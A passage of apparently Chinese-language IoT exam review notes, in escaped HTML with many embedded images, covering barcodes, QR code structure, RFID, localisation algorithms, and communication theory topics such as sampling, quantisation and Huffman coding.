&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152018801-1866241342.png&#34;
	width=&#34;913&#34;
	height=&#34;337&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152018801-1866241342_hu18282287845256082902.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152018801-1866241342_hu17047939291939332730.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619151031866&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;270&#34;
		data-flex-basis=&#34;650px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;三九条码：三九条码是一种一维条形码，是一种可供使用者双向扫描的分散式条码。&lt;/p&gt;
&lt;p&gt;三九条码拥有编码规则简单、误码率低，能表示字符个数多等特点。&lt;/p&gt;
&lt;p&gt;三九条码仅有两种单元宽度——宽单元和窄单元。宽单元的宽度为窄单元的1~3倍，一般多选用2倍、2.5倍或3倍。三九条码的每一个条码字符由九个单元组成，其中有三个宽单元，其余是窄单元，因此称为三九条码。三九条码的长度没有强迫性限制；三九条码的检查码可有可无；三九条码的起始码与终止码均为*字符。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152019044-1818631014.png&#34;
	width=&#34;417&#34;
	height=&#34;186&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152019044-1818631014_hu11417634095940091063.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152019044-1818631014_hu13711494972199197984.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619151035181&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;224&#34;
		data-flex-basis=&#34;538px&#34;
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;3p82二维矩形码相比于一维条形码的优势&#34;&gt;3.[P82]二维矩形码相比于一维条形码的优势。
&lt;/h2&gt;&lt;p&gt;二维码的特点：&lt;/p&gt;
&lt;p&gt;(1)信息容量大&lt;/p&gt;
&lt;p&gt;(2)编码范围广&lt;/p&gt;
&lt;p&gt;(3)保密、防伪性能好&lt;/p&gt;
&lt;p&gt;(4)译码可靠性高&lt;/p&gt;
&lt;p&gt;(5)修正错误能力强&lt;/p&gt;
&lt;p&gt;(6)容易制作且成本很低&lt;/p&gt;
&lt;p&gt;(7)条码符号的形状可变&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152019440-1049351575.png&#34;
	width=&#34;913&#34;
	height=&#34;469&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152019440-1049351575_hu7461351205896363487.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152019440-1049351575_hu9920883302572264254.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619151039664&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;194&#34;
		data-flex-basis=&#34;467px&#34;
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;4p88快速反应qr码的码结构和各部分的意义&#34;&gt;4.[P88]快速反应(QR)码的码结构和各部分的意义。
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;QR Code的结构：&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152019723-1164163182.png&#34;
	width=&#34;691&#34;
	height=&#34;439&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152019723-1164163182_hu425728436892658422.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152019723-1164163182_hu14180594464248147668.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619151118540&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;157&#34;
		data-flex-basis=&#34;377px&#34;
	
&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;QR Code有五个部分：
&lt;ul&gt;
&lt;li&gt;定位图形：用于对二维码的定位，不同的qrcode固定存在，大小规格会有差异&lt;/li&gt;
&lt;li&gt;校正图形：规格确定，校正图形的数量和位置也就确定了。&lt;/li&gt;
&lt;li&gt;格式信息：表示该二维码的纠错级别，分为L、M、Q、H.&lt;/li&gt;
&lt;li&gt;版本信息：二维码的规格，总共有40种规格矩阵。&lt;/li&gt;
&lt;li&gt;数据和纠错码：实际保存的二维码信息和纠错码字（用于修正二维码损坏带来的错误）。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;5p92射频识别rfid系统的组成和工作原理&#34;&gt;5.[P92]射频识别(RFID)系统的组成和工作原理。
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;RFID系统由电子标签、读写器和计算机网络组成的自动识别系统。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;从工作原理来看，系统一般由信号发射机、信号接收机、发射接收天线三部分组成。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;工作原理：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;电子标签和读写器利用各自携带的天线构筑两者之间进行数据传输的非接触式的通道。&lt;/li&gt;
&lt;li&gt;当标签处于读写器的工作范围时，读写器用天线发信号。&lt;/li&gt;
&lt;li&gt;电子标签接受信号产生感应电流，激活内部电路向读写器回送信号，或主动向读写器发送信号。&lt;/li&gt;
&lt;li&gt;读写器收到信号后对信号做处理，然后将处理后的数据上传到数据管理系统进行下一步处理。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;6p118两类定位技术基于测距和非测距的工作原理结合实验内容&#34;&gt;6.[P118]两类定位技术(基于测距和非测距)的工作原理(结合实验内容)。
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;基于测距：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;通过超声波或者无线电信号，测量声波或信号发送端到接收端时的信号强度、信号相位差以及信号传播时间差获取节点间的角度或距离信息。再利用空间几何方法完成未知节点的定位。&lt;/li&gt;
&lt;li&gt;[P125]定位算法：时间定位（TOA）、到达时差定位（TDOA）、方向测量定位(AOA)、信号强度定位(RSSI)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;无需测距：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;通过节点之间的信息交换和整个网络的连通性来实现定位，不需要额外网络设备。&lt;/li&gt;
&lt;li&gt;[P130]定位算法：DV-Hop定位、APIT定位算法、凸规划算法。
&lt;ul&gt;
&lt;li&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152020003-799689361.png&#34;
	width=&#34;853&#34;
	height=&#34;204&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152020003-799689361_hu15569590442359255174.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152020003-799689361_hu6453380067936040430.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619151127245&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;418&#34;
		data-flex-basis=&#34;1003px&#34;
	
&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;第四章&#34;&gt;第四章
&lt;/h1&gt;&lt;h2 id=&#34;1p138物联网通信系统模型和各模块的功能&#34;&gt;1.[P138]物联网通信系统模型和各模块的功能。
&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152020362-2080205815.png&#34;
	width=&#34;913&#34;
	height=&#34;260&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152020362-2080205815_hu4569541350905637377.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152020362-2080205815_hu14942757687194657826.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619151130451&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;351&#34;
		data-flex-basis=&#34;842px&#34;
	
&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;信源：传感器在感知层采集到的信息。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;采样量化：模数变化，把作为模拟信号的原始信息在时间域和幅值域进行离散化处理，得到有限个幅度值的离散信号。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;编码：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;信源编码：提高传输有效性：保证无失真的情况下用平均码长最短的码承载信源信息熵。&lt;/li&gt;
&lt;li&gt;信道编码：提高传输可靠性，引入额外监督位。&lt;/li&gt;
&lt;li&gt;编码后输出的数字信号叫基带信号。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;调制：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;目的：适合信道的传输特性并实现多路复用和多址接入。&lt;/li&gt;
&lt;li&gt;实现：将低频基带信号搬移到高频载波信号处。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;同步：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;载波同步：在接收端需要一个与发射端调制模块同频同相的载波信号，用于恢复出数字基带信号。&lt;/li&gt;
&lt;li&gt;帧同步：使接收端知道每一帧数据包中有用的信息的开始和结束。&lt;/li&gt;
&lt;li&gt;位同步：使接收端知道并判定每一位数字信号位。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;2p140通信指标的计算和物理意义&#34;&gt;2.[P140]通信指标的计算和物理意义。
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;数据传输速率&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;第一种：
&lt;ul&gt;
&lt;li&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152020612-992352474.png&#34;
	width=&#34;853&#34;
	height=&#34;159&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152020612-992352474_hu17173876081894985859.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152020612-992352474_hu3183081681468365385.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619151135830&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;536&#34;
		data-flex-basis=&#34;1287px&#34;
	
&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;例题：
&lt;ul&gt;
&lt;li&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152020845-672122140.png&#34;
	width=&#34;853&#34;
	height=&#34;95&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152020845-672122140_hu13915012369750090964.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152020845-672122140_hu17857177793367591369.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619151138962&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;897&#34;
		data-flex-basis=&#34;2154px&#34;
	
&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;第二种：
&lt;ul&gt;
&lt;li&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152021106-786457018.png&#34;
	width=&#34;853&#34;
	height=&#34;278&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152021106-786457018_hu365250072676767176.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152021106-786457018_hu698444988413982011.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619151143945&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;306&#34;
		data-flex-basis=&#34;736px&#34;
	
&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;误码率&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152021398-1810510854.png&#34;
	width=&#34;883&#34;
	height=&#34;310&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152021398-1810510854_hu13897961140673195704.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152021398-1810510854_hu17114673733960123207.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619151149390&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;284&#34;
		data-flex-basis=&#34;683px&#34;
	
&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;信道容量&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;对于有限带宽无噪声信道：
&lt;ul&gt;
&lt;li&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152021678-1752033939.png&#34;
	width=&#34;853&#34;
	height=&#34;253&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152021678-1752033939_hu4729642935247292522.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152021678-1752033939_hu17294744912194584289.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619151154482&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;337&#34;
		data-flex-basis=&#34;809px&#34;
	
&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;对于有限带宽随机噪声信道：
&lt;ul&gt;
&lt;li&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152021986-1072195080.png&#34;
	width=&#34;853&#34;
	height=&#34;548&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152021986-1072195080_hu6503329920363936067.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152021986-1072195080_hu395800175339060973.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619151157978&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;155&#34;
		data-flex-basis=&#34;373px&#34;
	
&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;3p143采样定理及物理意义&#34;&gt;3.[P143]采样定理及物理意义。
&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152022319-98562069.png&#34;
	width=&#34;893&#34;
	height=&#34;348&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152022319-98562069_hu7755487715523562487.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152022319-98562069_hu9287752565213554689.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619151206489&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;256&#34;
		data-flex-basis=&#34;615px&#34;
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;4p144非均匀量化相比于均匀量化的优势及实现原理&#34;&gt;4.[P144]非均匀量化相比于均匀量化的优势及实现原理
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;量化特征有【均匀量化】和【非均匀量化】&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;【均匀量化】的分层间隔为等间隔，适用于幅度均匀的分布的信号。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;特点：概率密度大的区域分层间隔小，反之分层间隔大。&lt;/li&gt;
&lt;li&gt;缺点：在满足信噪比要求的输入信号取值范围内进行均匀量化时，信号动态范围将受到较大限制。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;【非均匀量化】：根据信号的不同区间确定间隔。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;特点：小信号量化台阶减小，大信号的量化台阶增大。&lt;/li&gt;
&lt;li&gt;改善小信号的信噪比，并在不增大量化级数的条件下使信号在较宽动态范围内信噪比达到指标要求。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;5p147无失真离散无记忆信源编码定理和变长编码&#34;&gt;5.[P147]无失真离散无记忆信源编码定理和变长编码。
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;信息量：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152022599-1838208343.png&#34;
	width=&#34;757&#34;
	height=&#34;467&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152022599-1838208343_hu7969340344424425524.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152022599-1838208343_hu9213405946960541910.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619151217887&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;162&#34;
		data-flex-basis=&#34;389px&#34;
	
&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;信道熵：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152022853-588643550.png&#34;
	width=&#34;715&#34;
	height=&#34;278&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152022853-588643550_hu10212447359117420290.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152022853-588643550_hu12161853175186726170.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619151222118&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;257&#34;
		data-flex-basis=&#34;617px&#34;
	
&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;信源编码定理：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152023121-1017128870.png&#34;
	width=&#34;883&#34;
	height=&#34;81&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152023121-1017128870_hu10501924880612438713.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152023121-1017128870_hu11650732265191720238.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619151225320&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;1090&#34;
		data-flex-basis=&#34;2616px&#34;
	
&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;变长编码：根据信源输出符号出现概率不同选择码字，出现概率大用短码，小的用长码，这样平均码长最短。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;哈夫曼编码：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152023373-387478777.png&#34;
	width=&#34;717&#34;
	height=&#34;255&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152023373-387478777_hu5410418826965075226.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152023373-387478777_hu3591937892463402669.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619151228964&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;281&#34;
		data-flex-basis=&#34;674px&#34;
	
&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;一个综合例题：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152023645-1185344687.png&#34;
	width=&#34;805&#34;
	height=&#34;365&#34;
